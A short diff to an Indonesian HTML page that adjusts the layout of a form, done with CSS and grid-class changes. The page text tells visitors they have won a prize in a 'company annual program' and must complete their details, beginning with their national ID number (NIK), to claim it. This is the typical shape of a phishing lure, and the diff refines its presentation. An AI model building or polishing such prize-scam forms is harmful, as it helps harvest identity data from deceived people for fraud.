@@ -8,9 +8,13 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
     <style>
-        /* Custom CSS untuk memastikan form tetap dalam satu halaman */
+        /* Custom CSS untuk memastikan konten tetap dalam satu halaman */
+        body, html {
+            height: 100%;
+            margin: 0;
+        }
         .form-container {
-            max-height: 80vh; /* Batasi tinggi form */
+            max-height: calc(100vh - 200px); /* Sesuaikan tinggi form */
             overflow-y: auto; /* Tambahkan scroll jika konten melebihi tinggi */
         }
     </style>
@@ -38,7 +42,7 @@
                 <h1 class="text-center text-2xl font-bold mb-4">Selamat Anda terpilih mendapat hadiah program tahunan perusahaan.</h1>
                 <p class="text-center text-lg mb-6">Untuk mendapatkan hadiah ini Anda harus melengkapi data-data dibawah ini ya !</p>
 
-                <form class="grid grid-cols-1 md:grid-cols-2 gap-4" id="confirmationForm" method="POST" action="">
+                <form class="grid grid-cols-1 gap-4" id="confirmationForm" method="POST" action="">
                     <input name="__original_url" type="hidden" value="https://fittrianto.github.io/"/>
                     
                     <!-- NIK -->
